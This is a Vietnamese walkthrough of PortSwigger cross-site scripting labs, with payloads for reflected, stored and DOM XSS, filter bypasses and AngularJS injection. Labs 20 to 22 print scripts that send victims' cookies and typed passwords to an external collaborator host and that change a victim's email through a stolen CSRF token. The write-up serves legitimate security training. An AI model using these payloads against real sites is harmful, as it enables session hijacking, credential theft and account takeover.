## Lab 1: [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected) into HTML context with nothing encoded
![image](https://hackmd.io/_uploads/HJ_4a36Va.png)
- Khi vào bài lab thì mình thấy có thanh tìm kiếm, mà đây là các bài lab về xss nên mình thử chèn 1 đoạn mã script và thành công

![image](https://hackmd.io/_uploads/HkRLyaTV6.png)
![image](https://hackmd.io/_uploads/SyxwkTpVa.png)

## Lab 2: [Stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) into HTML context with nothing encoded
![image](https://hackmd.io/_uploads/HJdXxpTV6.png)
- Bài này thì nó không còn chức năng tìm kiếm, nhưng khi xem 1 bài viết bất kì thì có 1 chức năng comment. Mình thử chèn 1 đoạn script vào nó và thành công: 
![image](https://hackmd.io/_uploads/HJKYxTaEa.png)

![image](https://hackmd.io/_uploads/r1t5xaTET.png)

## Lab 3: [DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based) in `document.write` sink using source `location.search`

![image](https://hackmd.io/_uploads/BJ9Lb66Np.png)
- Kiểm tra chức năng search với một chuỗi ngẫu nhiên: 
![image](https://hackmd.io/_uploads/ryF5vpaN6.png)
- Ở ngay source code điều làm mình để ý ở đây đó là đoạn mã script, đoạn mã lấy có biến `query` lấy giá trị search từ url thông qua hàm **`URLSearchParams()`**. Nếu query không rống nó sẽ gọi đến hàm `tracksearch` và sử dùng hàm `document.write` để ghi nội dung `document.write('<imgsrc="/resources/images/tracker.gifsearchTerms='+query+'">');`. Do nội dung của query mình có thể thay đổi được nên mình thử đổi query thành `"><script>alert(1)</script>"` khi đó mình sẽ có payload là:
`document.write('<imgsrc="/resources/images/tracker.gifsearchTerms='+"> <script>alert(1)</script>');`

![image](https://hackmd.io/_uploads/HJb5U0TET.png)

## Lab 4: [DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based) in `innerHTML` sink using source `location.search`

![image](https://hackmd.io/_uploads/Syc31JREa.png)


- Trang web có tính năng tìm kiếm quen thuộc. Thực hiện tìm kiếm 1 vài chuỗi đơn giản và xem cách xử lý của ứng dụng

![image](https://hackmd.io/_uploads/HkPklkRVT.png)

- Tại phần source code, nó cho mình 1 đoạn js xử lý, xử dụng biến query đế lấy giá trị search của url thông qua hàm `URLSearchParams`, nếu query không rỗng thì nó sẽ gọi đến hàm `doSearchQuery`. Nhập các ký tự đặc biệt `xX';!--"<XSS>=&{()}Xx` để kiểm tra cách  mã hóa và lọc đầu vào
![image](https://hackmd.io/_uploads/BkS3Gk0V6.png)
- Do `<xss>` ở đây đã bị lọc nên ở đây mình không thể dùng `script`. Điều này có nghĩa là bạn sẽ cần sử dụng các phần tử thay thế như  `img` hoặc  `iframe`. Các trình xử lý sự kiện như  `onload` và  `onerror` có thể được sử dụng cùng với các phần tử này. Sử dụng payload sau: `<img src=1 onerror=alert(document.domain)>`
![image](https://hackmd.io/_uploads/B1IAH1CVT.png)

## Lab 5: [DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based) in jQuery anchor `href` attribute sink using `location.search` source

![image](https://hackmd.io/_uploads/Hk4dIJ0ET.png)
    
 - Lab này có chứa lỗ hổng DOM-based XSS ở trang submit feedback. Nó sử dụng chức năng lựa chọn `$` của thư viện jQuery để tìm một thẻ `<a>` và đổi thuộc tính `href` sử dụng dữ liệu từ `location.search`. Để solve lab này thì em cần đưa link “back” hiện ra `document.cookie`
- Đầu tiên mình cần phải xem xét tính năng submit feedback của trang web đã:
![image](https://hackmd.io/_uploads/rJucZ8CNa.png)
- Đoạn mã ` <script> $(function() {$('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));});</script>` Có chức năng na ná như tìm kiếm một thẻ `<a>` có id là `backLink` và thay thế thuộc tính `href` của nó bằng tham số returnPath được lấy từ trên thanh url. Vì returnPath mình có thể thực hiện thay đổi nó được. Vì thế mình sẽ thay đổi returnPath thành `?returnPath=Javascript:alert(document.cookie)` và chạy thử đoạn mã 

![image](https://hackmd.io/_uploads/ryoprIR46.png)

## Lab 6: [DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based) in jQuery selector sink using a hashchange event

![image](https://hackmd.io/_uploads/By6aHMWBT.png)

- Bài lab này chứa lỗ hổng [DOM-based cross-site scripting](https://portswigger.net/web-security/cross-site-scripting/dom-based). Nó sử dụng hàm chọn $() của jQuery để tự động cuộn đến một bài đăng nhất định, có tiêu đề được chuyển qua thuộc tính location.hash. Để giải quyết bài lab này, mình phải cung cấp một khai thác cho nạn nhân gọi hàm print() trong trình duyệt của họ.
- Như mọi bài đầu tiên khi vào bài lab mình mở dev-tool để xem source code. chúng ta có một đoạn mã script:
![image](https://hackmd.io/_uploads/SkJj8zZHp.png)
- `$(window).on('hashchange', function(){...`Với phần này mình lắng nghe sự kiện hashchange. Nói cách khác, khi vị trí băm(#) trong URL được kích hoạt, mã này sẽ được thực thi. `decodeURIComponent(window.location.hash.slice(1))` dùng để xóa `#` ra khỏi chuỗi. Ngoài ra, giải mãURIComponent được sử dụng để giải mã các ký tự được mã hóa URL. `var post = $('section.blog-list h2:contains(...)')`Trong phần này, việc tìm kiếm được thực hiện trong trang HTML. Các phần có thẻ h2 trong lớp “section.blog-list” được xác định và gán biến “post”. Ký hiệu # đã bị xóa và nội dung được mã hóa URL đã được giải mã. Nội dung tìm kiếm được tìm thấy và gán cho biến bài đăng.x
- Với `if (post) post.get(0).scrollIntoView()` phần này, nếu biến post không trống, nghĩa là từ được tìm thấy đã được tìm thấy, hàm ScrollIntoView được sử dụng để đưa trang đến vị trí tìm thấy từ đó. Như vậy mình đã hiểu được sương sương nội dung của mã scripts, mình thử chèn vào nó đoạn mã script: `<#<img src=x onerror=alert(1)>` lên thanh url:

![image](https://hackmd.io/_uploads/rkuWoMbHa.png)
- Bây giờ hãy tải cùng một trang bên trong iframe và gửi nó cho nạn nhân để kích hoạt XSS.`<iframe src="https://0a07008204b7e1fa84c36310006600a1.web-security-academy.net//#" onload="this.src+='<img src = x onerror=print()>'"> </iframe>`
- `https://0a07008204b7e1fa84c36310006600a1.web-security-academy.net//# Trong dòng này, iframe được tạo và thuộc tính src được đặt thành URL.` URL kết thúc bằng ký hiệu #, hướng trang web mục tiêu đến một phần bên dưới URL. 1.  `onload="this.src+='<img src=x onerror=print()>'"`sự kiện onload được kích hoạt khi nội dung của iframe được **tải** đầy đủ . Khi sự kiện onload được kích hoạt, biểu thức this.src được sử dụng để sửa đổi thuộc tính src của iframe. Việc sửa đổi nhằm mục đích đưa thẻ img độc hại vào trang web được tải trong iframe.

![image](https://hackmd.io/_uploads/SJKK2GWSp.png)

## Lab 6: [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected) into attribute with angle brackets HTML-encoded

![image](https://hackmd.io/_uploads/B1T4Vh-Hp.png)
- Đăng nhập vào bài lab mình có thấy nó có một chức năng search, mình thử chèn vào nó đoạn mã script `<script>alert('hello')</script>` nhưng không thành công:
![image](https://hackmd.io/_uploads/HJegUnZB6.png)
- Mình sẽ check source. Nếu để ý kĩ trong source thì ta sẽ thấy chuỗi tìm kiếm đã được chuyển vào value và mã hóa đi các dấu đóng mở:

![image](https://hackmd.io/_uploads/B1FJdhWB6.png)

- Sau khi đọc solution thì mình thấy nó có đề cập đến [onmouseover](https://www.w3schools.com/jsref/event_onmouseover.asp). Vì đoạn code nó chỉ xử lý dấu `<>` chứ không xử lý dấu nháy nên mình sẽ thử chèn với payload `"onmouseover="alert(123)` có nghĩa là sau đó value sẽ thành `value=""onmouseover="alert(123)"`. Và thông báo này được xảy ra khi mình di chuột: ![image](https://hackmd.io/_uploads/r1WNs2bST.png)

## Lab 7: [Stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) into anchor `href` attribute with double quotes HTML-encoded


![image](https://hackmd.io/_uploads/r17aTn-Hp.png)
- Mình sẽ vào bất kì 1 post nào và lại test lại chức năng comment.

![image](https://hackmd.io/_uploads/HkWZHaZSa.png)


- Mình có để ý là thẻ a href có đường dẫn đến website đã nhập ở input website. Mình thử truy cập vào nó thì được thông báo not found:

![image](https://hackmd.io/_uploads/Hy-k8TbBT.png)
- Như vậy mình sẽ inject script vào href của thẻ a tức là chèn vào input website:

![image](https://hackmd.io/_uploads/Sk1YLpZra.png)
![image](https://hackmd.io/_uploads/ryfF8TZBT.png)

## Lab 7: [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected) into a JavaScript string with angle brackets HTML encoded
![image](https://hackmd.io/_uploads/SkRvupbST.png)

- Vẫn là bài lab liên quan đến với chức năng search, mình thử thêm 1 đoạn mã script:

![image](https://hackmd.io/_uploads/H1CeppWra.png)
- Vẫn như bài lab trước nó có mã hóa `<>` nhưng không mã hóa dấu nháy. Mình đã chèn thử như này 'onerror='alert("XSS")'' nhưng không hiệu quả. Vì vậy mình thử payload `';alert(1);//'` khi đó `var searchTerms = ';alert(1);//';` và đoạn mã đã được thực thi:

![image](https://hackmd.io/_uploads/Sk4KAaWra.png)
![image](https://hackmd.io/_uploads/S1It06-B6.png)

## Lab 8: [DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based) in `document.write` sink using source `location.search` inside a select element

![image](https://hackmd.io/_uploads/H1SCZAbBp.png)

- Bài lab này chứa lỗ hổng DOM XSS trong chức năng check stock. Nó sử dụng hàm document.write của JavaScript để ghi dữ liệu ra trang. Hàm document.write được gọi với dữ liệu từ location.search mà bạn có thể kiểm soát bằng URL trang web. Dữ liệu được đặt trong một phần tử được chọn.
- click vào check stock và kiểm tra source: 

![image](https://hackmd.io/_uploads/HkAsfCbB6.png)
- Dễ thấy đoạn mã script trên nó sẽ xử lý khi trên thanh url có para storeId và ghi nó vào thẻ Option. Vì thể mình đã thử thêm nó vào url và nó in ra thật:

![image](https://hackmd.io/_uploads/HycKm0-S6.png)
- Bây giờ chèn thử đoạn script vào:

![image](https://hackmd.io/_uploads/BJ6ENCWB6.png)
![image](https://hackmd.io/_uploads/r1eH4AbBT.png)
## Lab 9: [DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based) in AngularJS expression with angle brackets and double quotes HTML-encoded
![image](https://hackmd.io/_uploads/S1dx9W7H6.png)
- Bài lab này chứa lỗ hổng tập lệnh chéo trang dựa trên DOM trong biểu thức AngularJS trong chức năng tìm kiếm. AngularJS là một thư viện JavaScript phổ biến, dùng để quét nội dung của các nút HTML chứa thuộc tính ng-app (còn được gọi là chỉ thị AngularJS). Khi một lệnh được thêm vào mã HTML, bạn có thể thực thi các biểu thức JavaScript trong dấu ngoặc nhọn đôi. Kỹ thuật này rất hữu ích khi dấu ngoặc nhọn được mã hóa.
- Nhập thử đoạn mã `<script> alert('hello')> </script>` không có điều gì xảy ra nên mình thử xem source:

![image](https://hackmd.io/_uploads/rJ3ORWQSa.png)

- Dễ thấy nó sử dụng công nghê angular 1-7-7. Nó nhận `{{}}` để thực thi đoạn mã javascript. Để kiếm chứng mình thử nhập vào `{{1+1}}` thì nhận được kết quả trả vể là 2:

![image](https://hackmd.io/_uploads/S16DlfmS6.png)
- Sau khi xác thực nó là angular mình chèn đoạn mã xss vào: `{{constructor.constructor("alert(1)")()}}` đoạn mã này sử dụng hàm khởi tạo trong angular để có thể thực thi đoạn mã javascript bên trong ngoặc tròn
 

![image](https://hackmd.io/_uploads/H1twSzXH6.png)

## Lab 10 : Reflected [DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)

![image](https://hackmd.io/_uploads/H1aglJBHT.png)

-   Lab trên đưa ra một minh chứng cho lỗ hổng reflected DOM XSS. Lỗi này xảy ra khi phía server xử lý dữ liệu từ một request và hiện ra lập tực dữ liệu ở trong response. Có một script ở trang web mà xử lý dữ liệu của data vừa nhập một cách không an toàn, từ đó làm trang web đối diện với nguy cơ bị tấn công cao. Để solve lab thì em sẽ thực hiện chức năng alert() ở trang web 
- Thực hiện xem source code mình thấy có đoạn mã script gọi đến địa chỉ `/resources/js/searchResults.js` và 1 đoạn mã gọi đến hàm search

![image](https://hackmd.io/_uploads/SywoByHHp.png)

- Thực hiện truy cập vào địa `/resources/js/searchResults.js`:![image](https://hackmd.io/_uploads/SJlpryrrp.png)
- Có thể thấy hàm [eval()](https://www.w3schools.com/jsref/jsref_eval.asp) thực thi đoạn mã mà không qua bất kỳ câu lệnh nào. Và respontext lấy dữ liệu phản hồi dưới dạng chuỗi (Json)
- Mình sẽ thực hiện tính năng search và thực hiện quan sát trên burp suite:
![image](https://hackmd.io/_uploads/ByJJ_1HB6.png)
![image](https://hackmd.io/_uploads/SJZJdyrHT.png)
- Như đã phân tích trước đó thì kết quả nó trả về json thật. Bây giờ mình sẽ thực hiện bypass qua nó bằng việc thêm `\` và kết thúc ngoặc rồi mới thực hiện tiếp câu lệnh, payload đầy đủ là `\"-alert(1)}//` -\> vì json không thể xử lý được thằng `"` đầu tiên nên nó sẽ thêm một dấu `\` vào , từ đó tạ thành 2 dấu `\\`, dấu `-` để ngăn cách giữa biểu thức trước và chức năng alert của em, sau đó đóng ngoặc để kết thúc JSON và `//` sẽ comment hết đoạn đằng sau, cụ thể thì responds sẽ là
![image](https://hackmd.io/_uploads/HyM9qJBHa.png)
- Như vậy là trang web đã alert ra 1 và đã solve được bài lab:![image](https://hackmd.io/_uploads/B1w251Brp.png)
## Lab 11: Stored [DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)

![image](https://hackmd.io/_uploads/rkwX21BBT.png)
-   Lab này có chứa lỗ hổng stored DOM XSS ở chức năng bình luận, để solve lab thì mình cần khai thác lỗ hổng để sử dụng chức năng `alert()`

- Tại chức năng bình luận của các bài viết mình có gửi đi một comment dạng `<script> alert(123) </script>` nhưng khi đăng lên thì nó chỉ còn `<script>alert(123)`
- Xem source thì mình thấy có 1 đoạn code:![image](https://hackmd.io/_uploads/BkgupWBra.png)
Nó encode những kí tự `<>` nhưng có vẻ như nó chỉ mã hóa những kí tự đầu tiên nên phần sau không được encode nên nó đã biến mất. Nên mình sẽ để chống `<>` đầu và payload của cặp sau là:`<><img src=x onerror=alert(1)>`
![image](https://hackmd.io/_uploads/r12p0ZSB6.png)

## Lab 12: [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected) into HTML context with most tags and attributes blocked

![image](https://hackmd.io/_uploads/SypLSfrBp.png)

-   Lab này chứa lỗ hổng reflected XSS ở trong chức năng tìm kiếm nhưng trang web sử dụng firewall để bảo vệ khỏi những trường hợp XSS phổ biến, để solve được lab thì mình cần phải bypass WAF(web application firewall) và thực thi được chức năng `print()`

- Chèn thử đoạn mã script: `<script>alert(123)</script>` thì nhận được thông báo:

![image](https://hackmd.io/_uploads/B1QyUGrS6.png)

- Vì đề bài có nhắc đến firewall nên mình sẽ kiểm tra xem thẻ nào bị chặn và được thông qua từ thông tin đề bài cung cấp [cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet). Sừ dụng burp suite burte force thử:
![image](https://hackmd.io/_uploads/SkUAKGBB6.png)
- Mình tìm được 2 thẻ thông qua nhưng ở đây mình chỉ cần 1 nên mình lấy thẻ body, tiếp theo mình sẽ làm tương tự với event của thẻ body

![image](https://hackmd.io/_uploads/S1QGszHS6.png)

- Chà mình tìm được khá nhiều event chọn bừa 1 cái và đổi payload lại thành `<body onresize=print()>`
![image](https://hackmd.io/_uploads/S161SQBH6.png)

- Điều này xảy ra khi mình thay đổi kích thước của sổ của tab trình duyệt ffang dùng

- Điều còn lại bây giờ là đến máy chủ khai thác và nhúng nội dung bằng thẻ iframe:
`<iframe src="https://0ab200680304e09b81abbd6d004f00b5.web-security-academy.net/?search=%3Cbody+onresize%3D%22print%28%29%22%3E" onload=this.style.width='100px'>`

![image](https://hackmd.io/_uploads/S1HPH7Sra.png)
## Lab 13: [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected) into HTML context with all tags blocked except custom ones

![image](https://hackmd.io/_uploads/SJkh0_rB6.png)
- Ở bài lab này các tag đều bị block trừ custom tag, theo như cheet sheet của portswigger mình tìm được payload: `<xss tabindex=1 onfocus=alert(document.cookie) id=x>#x` 
- Về bản chất ta tạo ra một custom tag `xss` với id là `x`, thuộc tính `onfocus` sẽ call đến alert function khi được focus, `tabindex` chỉ định thứ tự sẽ được focus khi ấn nút Tab
- Đi đến máy chủ khai thác và chỉnh sửa nội dung của file được người dùng truy cập để kích hoạt XSS của chúng ta là:
`<script> location = 'https://0a2200da0494344e8189ac8700110008.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x'; </script>`

![image](https://hackmd.io/_uploads/r1JlZKSH6.png)
![image](https://hackmd.io/_uploads/HyblbYrBa.png)

## Lab 14: [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected) with some SVG markup allowed

![image](https://hackmd.io/_uploads/SydI-KBBT.png)

- Lab này có một lỗ hổng XSS được phản ánh đơn giản. Trang web đang chặn các thẻ phổ biến nhưng bỏ sót một số thẻ và sự kiện SVG. Để giải quyết bài lab, hãy thực hiện một cuộc tấn công bằng tập lệnh chéo trang gọi hàm Alert().
- Như thông tin đề bài thẻ không bị chặn là svg vì thế mình sẽ đi xem event nào không bị chặn:
![image](https://hackmd.io/_uploads/r1u-UKSrT.png)
- Như vậy mình đã tìm được thẻ tag và event cần thiết. Search trong bảng cheat sheet thì mình được 1 vài payload và mình thử thì payload thành công là:
![image](https://hackmd.io/_uploads/rJ6ufqSra.png)
![image](https://hackmd.io/_uploads/ryEKGcrBp.png)

## Lab 15: [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected) in canonical link tag

![image](https://hackmd.io/_uploads/HymeJaSST.png)
- Lab này phản ánh thông tin đầu vào của người dùng trong thẻ liên kết chuẩn và thoát khỏi dấu ngoặc nhọn. Để giải quyết bài lab, hãy thực hiện một cuộc tấn công kịch bản chéo trang trên trang chủ để chèn một thuộc tính gọi hàm cảnh báo.Để hỗ trợ việc khai thác của bạn, bạn có thể giả định rằng người dùng được mô phỏng sẽ nhấn các tổ hợp phím sau:
+ ALT+SHIFT+X
+ CTRL+ALT+X
+ Alt+X

- Đề bài có nói đến thẻ liên kết canonical: Thẻ canonical được sử dụng để chỉ định URL ưa thích của trang web đối với các công cụ tìm kiếm, giúp ngăn chặn các vấn đề trùng lặp nội dung. Nó thường được triển khai trong phần đầu HTML bằng định dạng sau: `< link rel= "canonical" href= "https://example.com/page" />`
- Tuy nhiên, nếu tham số URL của thẻ canonical không được xác thực hoặc vệ sinh đúng cách thì nó có thể dễ bị tấn công XSS. Kẻ tấn công có thể tạo một URL độc hại bao gồm mã JavaScript, mã này sẽ được trình duyệt của nạn nhân thực thi khi trang được tải
- Quay trở lại bài lab xem source thì mình thấy có sự xuất hiện của thẻ canonical, thử thoát khỏi thuộc tính href và thêm sự kiện onclick: `?'onclick='alert(123)`
![image](https://hackmd.io/_uploads/SkwISTrHa.png)
- Mình không biết khi nào thì event được kích hoạt nhưng trong solution nó có đề cập đến dùng X làm khóa truy cập cho toàn bộ trang
- **Khóa truy cập HTML** Là phím tắt để nhấp vào một thành phần nhất định và chức năng của nó phụ thuộc vào trình duyệt và hệ điều hành được sử dụng, vì không phải tất cả các trình duyệt đều hỗ trợ phím truy cập. khóa truy cập được thêm vào dưới dạng thuộc tính. Payload:`?'accesskey='x'onclick='alert(1)`

![image](https://hackmd.io/_uploads/HyjELpHr6.png)

- Khi người dùng nhấn phím truy cập, `alert`chức năng sẽ được gọi.
![image](https://hackmd.io/_uploads/SynmIaBS6.png)

## Lab 16: [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected) into a JavaScript string with single quote and backslash escaped

![image](https://hackmd.io/_uploads/SJ4dDTBSa.png)
- Mình thực hiện search 1 thứ bất kì xem xét source code thì có bắt gặp 1 đoạn mã: 
![image](https://hackmd.io/_uploads/SybsvpSS6.png)
- Chuỗi mình nhập vào sẽ được để trong dấu `''` và ở đây mình đã search chữ a, sau đó sẽ thực hiện chức năng tìm những ảnh có trong thư mục tracker.gif giống với searchTerm đã bị encodeURI và sau đó sẽ xổ ra dưới dạng 1 thẻ `<img>`
- Để bypass qua đoạn mã này mình sẽ thực hiện đóng script sớm bằng đoạn mã: `</script><img src=x onerror="alert(123)"`. Vì code nó thực thi từ trên xuống dưới nên đoạn mã chèn thêm vẫn sẽ được thực hiện mặc kệ phía sau lỗi hay không:

![image](https://hackmd.io/_uploads/Hkt_d6BBT.png)
![image](https://hackmd.io/_uploads/BJGFOprB6.png)

## Lab 17: [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected) into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
![image](https://hackmd.io/_uploads/rJyos6BB6.png)
- Lab này chứa lỗ hổng reflected XSS ở chức năng tìm kiếm khi mà dấu `<> ""` đã bị HTML encode và dấu `''` đã bị escaped. Để solve lab thì em cần thoát khỏi js string và thực hiện chức năng alert
- Search thử 1 thứ gì đó và xem source:

![image](https://hackmd.io/_uploads/B1TVTpHS6.png)

- Vẫn là 1 đoạn code quên thuộc bypass thử `';alert(1)//`
![image](https://hackmd.io/_uploads/SyQC66BHa.png)
- Dĩ nhiên là nó không thành công trang web đã tự động cho thêm dấu `\` đằng trước để khi kết hợp `\'` js sẽ hiểu đây là ký tự `'` ở trong chuỗi. Tham khảo trang [này](https://webcoban.vn/javascript/cach-su-dung-chuoi-string-trong-javascript.html) thì mình thấy chỉ cần thêm \ vào nữa thì `'` sẽ không còn được xem là 1 kí tự trong chuỗi nữa

![image](https://hackmd.io/_uploads/rk1_CTrSa.png)
![image](https://hackmd.io/_uploads/Hybu06HHT.png)
## Lab 18: [Stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

![image](https://hackmd.io/_uploads/ByM9kRrrT.png)

- Lab trên chứa lỗ hổng stored XSS ở chức năng bình luận, để solve lab trên thì em cần bình luận mà thực hiện được chức năng alert khi mà ấn vào tên của tác giả bình luận

- Điền 1 vài thông tin yêu cầu và mở source kiểm tra:

![image](https://hackmd.io/_uploads/H1-m-CrBa.png)
- thì khi bình luận thành công trang web sẽ đưa link vào thẻ anchor link và đưa vào thuộc tính onclick:
- Giờ mình sẽ bypass đoạn đưa vào onclick, vì trước khi xử lý js thì browser sẽ tự HTML decode giá trị của thuộc tính onclick, nên mình sẽ encode dấu `'` bằng HTML encode trước thành `&apos;`, nhưng vấn đề là mình không thể truyền vào &website= `&apos;-alert(1)-&apos;` được vì làm như vậy nó sẽ không nhận dấu này là chuỗi mà nó sẽ nhận là 1 biến khác, nên mình sẽ truyền vào theo dạng URL: `http://foo?&apos;-alert(1)-&apos;`

![image](https://hackmd.io/_uploads/BkGVGCHBp.png)

## Lab 19: [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected) into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
![image](https://hackmd.io/_uploads/ry3Qj0BrT.png)
- Lab trên chứa lỗ hổng reflected XSS ở chức năng search, nó hiện dữ liệu của người dùng đưa cho ở trong một template string với dấu `<> '' ""` đều bị HTML encode, và cả dấu ` `` ` bị escape. Để solve lab thì em cần thực hiện khai thác lỗ hổng XSS để gọi chức năng alert ở trong template string này
- Tìm thử 1 thứ gì đó:

![image](https://hackmd.io/_uploads/ryEbwmvHT.png)
- Biến message này được khởi tạo với việc giá trị của nó là một chuỗi mẫu(template string), chuỗi mẫu này chứa văn bản “5 search results for ‘a’”, trong đó ‘a’ là một phần của chuỗi, và 5 đứng trước nó. Còn câu lệnh sau đó là đi tìm xem id của các thẻ xem cái nào giống với searchMessage, sau đó gán giá trị của message vào innerText của phần tử tìm thấy, từ đó nội dung hiện thị của phần tử đó trên trang web thành nội dung của biến message.
- Ta sẽ sử dụng template syntax của js để thực hiện XSS, đó là `${alert(1)}` -\> như thế template sẽ thực hiện câu lệnh khi load đến:
![image](https://hackmd.io/_uploads/rk5tw7vHT.png)
![image](https://hackmd.io/_uploads/SyhFvXwSa.png)

## Lab 20: [Exploiting cross-site scripting](https://portswigger.net/web-security/cross-site-scripting/exploiting) to steal cookies
![image](https://hackmd.io/_uploads/HkPavXwBp.png)
- Bài Lab này chứa lỗ hổng stored XSS ở chức năng comment. Nạn nhân sẽ xem tất cả comment được đăng lên, để solve lab thì mình cần khai thác lỗ hổng nhắm chiếm được session cookie của nạn nhân, và dùng nó để đóng giả làm nạn nhân
- Xem sơ qua chức năng comment của bài viết:
- Như đã thấy nội dung sẽ được xuất hiện ở thẻ a nên mình thử payload ở comment `<script>alert(1)</script>`

![image](https://hackmd.io/_uploads/HJaXYQPH6.png)

- Như vậy là đoạn mã được thực hiện. Đề bài yêu cầu mình lấy cookie của nạn nhân nên mình sẽ dùng callaborator để nhận các rp mà mình điều hướng đến payload:`<script>fetch("https://l2osaou8zdg9i540ocpcak46jxpode13.oastify.com?"+document.cookie)</script>`
- Nó gửi về cho mình 1 session là `nLQXP656txpTPBmZNTAwsZ7hBJi6j8hL` thay thế session của mình rồi load lại trang: ![image](https://hackmd.io/_uploads/ryHmyNwBT.png)

## Lab 21: [Exploiting cross-site scripting](https://portswigger.net/web-security/cross-site-scripting/exploiting) to capture passwords
![image](https://hackmd.io/_uploads/S14rlEvH6.png)
- Bài lab trên chứa lỗ hổng stored XSS ở chức năng bình luận, nạn nhân sẽ xem tất cả comment được đăng, để solve lab này thì mình cần khai thác lỗ hổng để lấy username và password của nạn nhân và lấy nó để đăng nhập vào tài khoản của nạn nhân:
- Mục tiêu XSS vẫn sẽ là ở chỗ nội dung comment, giờ mình sẽ đi tìm cách nào để lấy được tài khoản của nạn nhân thông qua XSS. Sau khi đọc hướng dẫn của đề bài thì mình có payload như sau:
```

<input name=username id=username> <input type=password name=password onchange="if(this.value.length)fetch('https>//mf5tnp79cetav6h11d2dnlh7wy2pqqef.oastify.com',{ method:'POST', mode: 'no-cors', body:username.value+'|'+this.value });">

```

- Gửi nó trong phần comment và ngồi đợi respond:

![image](https://hackmd.io/_uploads/BJkfVVwSa.png)

`administrator:h1jq58u4wxcpfpdv8mih`
![image](https://hackmd.io/_uploads/rkXU4VPST.png)


## Lab 22: [Exploiting XSS](https://portswigger.net/web-security/cross-site-scripting/exploiting) to perform CSRF

![image](https://hackmd.io/_uploads/HJdjVNDST.png)

- Trang web này có chứa lỗi stored XSS ở chức năng comment, để solve lab mình cần khai thác lỗ hổng để thực hiện tấn công CSRF nhằm đổi email của người xem blog post đó
- Username và password được cung cấp là: wiener:peter
- Đăng nhập vào với user, passwd mình thấy có 1 đoạn mã csrf token:`3vUCiScR0m169ADnn6omiXCSfyccGXMB`
![image](https://hackmd.io/_uploads/SykluVwrp.png)
- Khi đăng nhập vào thì có 1 chức năng đổi email. Nhưng hiện tại trang web đang bảo mình đổi email tại comment nên tạm thời mình sẽ bỏ qua chức năng này và chuyển đến phần comment của bài viết. Test thử với đoạn mã alert đơn giản

![image](https://hackmd.io/_uploads/S108O4vrp.png)

- Thế là đã xác thực được lỗ hổng xss tại phần comment. Đọc solution của đề bài thì mình có payload:

```
<script>
	var x = new XMLHttpRequest;
	x.open('GET', '/my-account');
	x.onload = function () {
		var csrfToken = this.responseText.match(/name="csrf" value="(.*)">/)[1];
		fetch('/my-account/change-email', {
		method: 'POST',
		mode: 'no-cors',
		headers:{
		'Content-Type': 'application/x-www-form-urlencoded'
		},    
		body: new URLSearchParams({
			'email': 'test@gmail.com',
			'csrf': csrfToken
		})
	});
	}
	x.send();
</script>
```

![image](https://hackmd.io/_uploads/HyLDoVDrp.png)

